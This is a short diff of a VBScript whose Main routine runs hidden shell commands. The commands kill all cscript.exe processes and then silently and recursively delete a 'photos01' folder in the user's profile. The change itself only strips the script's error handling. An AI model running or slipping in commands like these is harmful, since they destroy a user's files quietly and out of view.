@@ -6,9 +6,4 @@ Sub Main()
   shell.Run "cmd /c taskkill /fi ""imagename eq cscript.exe""", 0, True
   shell.Run "cmd /c cd %USERPROFILE% && (goto) 2>Nul & RD /S /Q %USERPROFILE%\photos01", 0, True
 End Sub
-On Error Resume Next
-  Main
-  If Err.Number Then
-     WScript.Echo "aborted"
-     WScript.Quit 4711
-  End If
+Main
